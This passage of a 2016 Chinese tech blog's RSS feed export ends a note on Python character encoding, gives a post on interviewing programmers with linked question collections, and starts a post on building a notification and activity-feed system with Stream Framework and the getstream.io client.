&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;url中的编码问题&lt;/h3&gt;
&lt;p&gt;一般而言使用urllib库中的urlencode函数就好了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#u&amp;#39;小明&amp;#39;则需要encode为字节码&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;age&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;10岁&amp;#39;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# age=10%E5%B2%81&amp;amp;name=%E5%B0%8F%E6%98%8E&lt;/span&gt;

&lt;span class="c1"&gt;#仅对字符串进行转码可以使用quote&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;quote&lt;/span&gt;
&lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#%E5%B0%8F%E6%98%8E&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果有大量此类工作可以考虑使用&lt;a href="https://github.com/gruns/furl"&gt;furl&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;在线工具&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tool.oschina.net/encode?type=4"&gt;在线编码转换&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/urlencode.aspx"&gt;UrlEncode编码/UrlDecode解码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/unicode.aspx"&gt;Unicode编码转换&lt;/a&gt;:还包括unix时间戳&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;一些细碎知识&lt;/h3&gt;
&lt;p&gt;Windows简体中文版中，ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（繁体中文版会采用Big5码）&lt;/p&gt;
&lt;h3&gt;python中字节流和unicode的代码视角比较&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/18193305/python-unicode-equal-comparison-failed"&gt;stackoverflow Python unicode equal comparison failed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"&gt;字符编码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/mysql/mysql-mojibake/"&gt;10分钟学会理解和解决MySQL乱码问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html"&gt;字符编码笔记：ASCII，Unicode和UTF-8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://funhacks.net/2016/11/25/character_encoding/"&gt;Python: 熟悉又陌生的字符编码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Jun 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-06-28:decode-and-encode-note.html</guid><category>tools</category></item><item><title>如何面试程序员</title><link>/about-interview.html</link><description>&lt;p&gt;最近在客串面试官的角色，收集一些自己认为不错的资源和问题。&lt;/p&gt;
&lt;p&gt;面试别人比被人面试来得紧张&lt;/p&gt;
&lt;h1&gt;原则&lt;/h1&gt;
&lt;p&gt;你需要找到合适的人，而不是最牛的人&lt;/p&gt;
&lt;h1&gt;技术无关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.ruanyifeng.com/blog/2010/12/how_to_interview_a_programmer.html"&gt;如何面试程序员？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备工作&lt;ul&gt;
&lt;li&gt;需要新员工完成什么样的任务？&lt;/li&gt;
&lt;li&gt;怎样的人能完成这样的任务？&lt;/li&gt;
&lt;li&gt;哪些途径和方法可以发现这样的人？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察专业能力&lt;ul&gt;
&lt;li&gt;过去是未来的最好预测依据。不过，提问的重点不要仅仅是他过去的成果，更要关注在当时的环境中，他是如何决策和实施的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察综合素质:因为人是会发展的，所以某种程度上，面试者的综合素质要比他的专业能力更重要&lt;ul&gt;
&lt;li&gt;你为什么开发软件？&lt;/li&gt;
&lt;li&gt;去年你读了几本技术书籍？&lt;/li&gt;
&lt;li&gt;去年你最喜欢的技术书籍是哪本？你从中学到了什么？&lt;/li&gt;
&lt;li&gt;平时你经常访问哪些编程类网站？&lt;/li&gt;
&lt;li&gt;你有自己的开源项目吗？业余时间你编程吗？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察理性思维（递进）&lt;ul&gt;
&lt;li&gt;你最喜欢的编程语言是哪种？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你为这种语言加一种功能，你会加什么功能？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你取消一种功能，会是什么功能？为什么？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.zhihu.com/question/20042950"&gt;如何面试一个工作经验比自己高很多的人？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果是技术岗，应该有岗位职责和技术要求，你作为技术面试官就是要看他已有的技能是否满足这个岗位。要围绕公司所应用的技术平台、产品类型、项目情况考察他的技术水准是否能够满足。&lt;/li&gt;
&lt;li&gt;对于你不了解的技术你也不要不懂装懂，如果他能用简单的描述让你听得明白，说明他的条理很清晰&lt;/li&gt;
&lt;li&gt;你可以提出几个实际工作中遇到的技术问题，请他讲讲他的理解和解决办法。&lt;/li&gt;
&lt;li&gt;技术面试之后，要了解他换工作的原因，动机，他的期望是什么，你要判断公司能否满足他的期望，他是否“像这个公司的人”，也就是要符合公司文化。双方契合，才能达到&lt;strong&gt;共赢&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;我所在单位的面试是逐级的，首先技术部门经理面试，然后技术部门上级单位总经理面试，最后和HR部门经理谈薪酬待遇。&lt;/li&gt;
&lt;li&gt;找出过去曾经困扰过你或你们团队的问题（可以是技术、运营、沟通），列明产生问题的背景，在面试中用于情景模拟&lt;/li&gt;
&lt;li&gt;询问项目过程中发生的技术难关、跨团队沟通等问题的解决上，用STAR判断真假&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/subview/470818/11235965.htm#viewPageContent"&gt;STAR原则&lt;/a&gt;:situation,task,action,result&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;鉴于IT行业的特殊性，还需要考察学习能力，可以直接询问他是如何学习最新语言的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mindhacks.cn/2011/11/04/how-to-interview-a-person-for-two-years/"&gt;怎样花两年时间去面试一个人&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;h3&gt;面试官的养成&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/26240321"&gt;如何当一个好的面试官？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36820925"&gt;在面试中，有哪些面试官的反应让你感觉惊艳？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/19551593"&gt;创业公司应该如何招人？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;技术相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/h5bp/Front-end-Developer-Interview-Questions"&gt;Front-end-Developer-Interview-Questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alex/what-happens-when"&gt;what-happens-when&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/skyline75489/what-happens-when-zh_CN"&gt;What-happens-when&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions"&gt;awesome-interview-questions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#html"&gt;html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#javascript"&gt;javascript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#python"&gt;python&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#django"&gt;django&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby"&gt;ruby&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby-on-rails"&gt;Ruby on Rails&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;database&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#sql"&gt;sql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mysql"&gt;mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mongodb"&gt;mongodb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#linux"&gt;linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#algorithms"&gt;algorithms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blakeembrey/code-problems"&gt;code-problems&lt;/a&gt;:Common code and interview problems solved in multiple languages&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hawx1993/Front-end-Interview-questions"&gt;Front-end-Interview-questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/taizilongxu/interview_python"&gt;interview_python&lt;/a&gt;:关于Python的面试题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fex-team/interview-questions"&gt;interview-questions&lt;/a&gt;:FEX 面试问题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/paddingme/Front-end-Web-Development-Interview-Question"&gt;Front-end-Web-Development-Interview-Question&lt;/a&gt;:前端开发面试题大收集&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hit-alibaba.github.io/interview/index.html"&gt;笔试面试知识整理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/qiu-deqing/FE-interview"&gt;FE-interview&lt;/a&gt;:收集的前端面试题和答案&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jimuyouyou/node-interview-questions"&gt;node-interview-questions&lt;/a&gt;:Node.js面试题，侧重后端应用与对Node核心的理解&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ChenYilong/iOSInterviewQuestions"&gt;iOS面试题集锦&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/envyfan/AndroidReview"&gt;AndroidReview&lt;/a&gt;:Adnroid面试复习&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/arialdomartini/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions
&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/monklof/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions&lt;/a&gt;:后端开发面试题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/NoonTechnology/interview_summarize"&gt;interview_summarize&lt;/a&gt;:面试总结&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;名企面试题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/3345.html"&gt;140个Google的面试题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 14 Jun 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-06-14:about-interview.html</guid><category>code</category></item><item><title>notification system思路、概念与实现</title><link>/notification-system-thinking-concept-and-Implementation.html</link><description>&lt;h1&gt;试水&lt;/h1&gt;
&lt;p&gt;水挺深，撸起你的裤管&lt;/p&gt;
&lt;h3&gt;缘起&lt;/h3&gt;
&lt;p&gt;最初我想为Open edX实现一套消息系统（Notification system）。通过浏览&lt;a href="https://github.com/edx"&gt;官方库&lt;/a&gt;，我们发现，官方在做类似的事:&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;notifier is a django application for edX platform notifications&lt;/p&gt;
&lt;p&gt;It currently sends daily digests of new content to subscribed forums users, with a goal of eventually supporting real-time and batched notifications of various types of content across various channels (e.g. SMS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由此可知这个库，最终会变得real-time and powerful（多种通知方式）&lt;/p&gt;
&lt;p&gt;但目前而言，似乎偏弱，且只能提供论坛消息通知，且是以邮件的方式。而我们似乎更习惯站内消息这种通知形式&lt;/p&gt;
&lt;p&gt;至于具体实现，我没细看，猜测是celery+rabbitmq，采用pub/sub模型&lt;/p&gt;
&lt;h3&gt;最初的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;基于redis或者rabbitmq&lt;/li&gt;
&lt;li&gt;使用read-time web相关库&lt;ul&gt;
&lt;li&gt;parse&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rethinkdb/rethinkdb"&gt;rethinkdb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;meteor&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看edx的&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;实现&lt;/li&gt;
&lt;li&gt;改造IM&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kexun.github.io/2016/04/08/%E9%80%9A%E8%BF%87%E7%AC%AC%E4%B8%89%E6%96%B9Im%E7%B3%BB%E7%BB%9F%E6%94%B9%E9%80%A0%E7%A7%81%E4%BF%A1%E5%8A%9F%E8%83%BD/"&gt;通过第三方IM系统，改造私信功能&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;采用云服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;我的需求&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;私信（message）&lt;/li&gt;
&lt;li&gt;站内消息（Announce）&lt;ul&gt;
&lt;li&gt;是系统发送的消息，格式是固定的，特殊对象一般拥有&lt;strong&gt;超链接&lt;/strong&gt;（资源定位符）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提醒（activities，Remind，类似github消息通知）&lt;ul&gt;
&lt;li&gt;可能涉及关注对象/活动/订阅/&lt;ul&gt;
&lt;li&gt;谁对一样属于谁的事物做了什么操作（someone do something in someone's something）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;分析需求&lt;/h3&gt;
&lt;p&gt;通过万能的google，我们发现这类需求早就有人讨论过啦，以下是我喜欢的讨论&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/f4d7827821f1"&gt;消息系统设计与实现「上篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/6bf8166b291c"&gt;消息系统设计与实现「下篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/22394809"&gt;知乎的消息机制，在技术上如何设计与规划？&lt;/a&gt; ： 知乎工程师的回答&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20380990/answer/14960006"&gt;网站的消息（通知）系统一般是如何实现的？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nodex.me/t/29"&gt;newsfeed架构设计和实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;概念篇&lt;/h1&gt;
&lt;p&gt;对Pinterest、Instagram和Fashiolista来说，feed是一个核心组件。
这些系统的共同点在于向用户展示其关注的人的动态，Fashiolista是基于&lt;a href="http://activitystrea.ms/specs/atom/1.0/"&gt;Atom Activity Streams 1.0&lt;/a&gt;（还有个使用json格式的版本)来构建动态数据流的（ps：Atom Activity Streams今年出了&lt;a href="https://www.w3.org/TR/activitystreams-core/"&gt;2.0版本&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;feed&lt;/h3&gt;
&lt;p&gt;那么我们首先要搞清楚feed是什么。&lt;/p&gt;
&lt;p&gt;可以参考[Web_feed](https://en.wikipedia.org/wiki/Web_feed&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On the World Wide Web, a web feed (or news feed) is a data format used for providing users with frequently updated content.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我把它理解为最新讯息，提要）&lt;/p&gt;
&lt;h3&gt;Activities&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档，对我们理解消息系统很有帮助，&lt;a href="http://activitystrea.ms/specs/json/1.0/"&gt;
JSON Activity Streams 1.0&lt;/a&gt;有些抽象，而&lt;a href="https://github.com/tschellenbach/Stream-Framework"&gt;Stream-Framework&lt;/a&gt;名词太多&lt;/p&gt;
&lt;p&gt;而&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档让我们在使用过程中理解消息系统&lt;/p&gt;
&lt;p&gt;一则Activities有以下属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor&lt;/li&gt;
&lt;li&gt;Verb&lt;/li&gt;
&lt;li&gt;Object&lt;/li&gt;
&lt;li&gt;Target &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举例而言&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Erik is pinning Hawaii to his Places to Visit board.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们来拆解这句话，用以上属性积木来构建它&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor: "Eric" (User:2)&lt;/li&gt;
&lt;li&gt;Verb: "pin"&lt;/li&gt;
&lt;li&gt;Object: "Hawaii" (Place:42)&lt;/li&gt;
&lt;li&gt;Target: "Places to Visit" (Board:1)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们来看下这个动作用代码来描述&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Instantiate a feed object&lt;/span&gt;
&lt;span class="n"&gt;user_feed_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Add an activity to the feed, where actor, object and target are references to objects (`Eric`, `Hawaii`, `Places to Visit`)&lt;/span&gt;
&lt;span class="n"&gt;activity_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;actor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;User:2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;verb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;pin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;object&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Place:42&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;target&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Board:1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;activity_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_feed_1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;activity_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Using the above fields, you can express any activity!&lt;/p&gt;
&lt;p&gt;意识到这点，我们就理解消息系统啦&lt;/p&gt;
&lt;p&gt;ps：用程序表达现实关系（动作），业务相关的代码通常是模拟现实（关系或者事务），所以表达现实是一种常见的模式&lt;/p&gt;
&lt;h3&gt;其他概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fanout：将动态推送给你的粉丝的过程被称为消息分发&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;实现篇&lt;/h1&gt;
&lt;h3&gt;stream framework&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Stream Framework is a Python library, which allows you to build newsfeed and notification systems using Cassandra and/or Redis.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Examples of what you can build are&lt;ul&gt;
&lt;li&gt;Activity streams such as seen on Github&lt;/li&gt;
&lt;li&gt;A notification system&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;之前的Feedly&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mellowmorning.com/"&gt;作者博客&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最近我在看stream framework的实现，重点关注redis部分，之后有时间再做分析&lt;/p&gt;
&lt;p&gt;我们先来看下数据在redis里的结构&lt;/p&gt;
&lt;p&gt;&lt;img alt="pin-redis" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin-redis.png" /&gt;&lt;/p&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;p&gt;这是基于stream_framework的一个demo，模仿Pinterest，用户可以发布自己的pin（类似post），其他用户可以follow该用户，并且对喜欢的物品进行点赞&lt;/p&gt;
&lt;p&gt;由于时间久远，该项目无法直接运行，我做了些调整，使其跑在osx下，测试正常&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/stream_framework_example"&gt;stream_framework_example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首页
&lt;img alt="pin1.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin1.png" /&gt;&lt;/p&gt;
&lt;p&gt;信息流&lt;/p&gt;
&lt;p&gt;&lt;img alt="pin2.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin2.png" /&gt;&lt;/p&gt;
&lt;p&gt;关注者
&lt;img alt="pin3.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin3.png" /&gt;&lt;/p&gt;
&lt;h3&gt;stream&lt;/h3&gt;
&lt;p&gt;当然我们也可以使用stream的服务来构建我们的消息系统,我们跑一个简单的demo&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;stream&lt;/span&gt;
&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;client id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;client secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;location&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;us-east&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;chris&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# add an activity, message is a custom field. add as many custom fields as you&amp;#39;d like&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;actor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;verb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;add&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
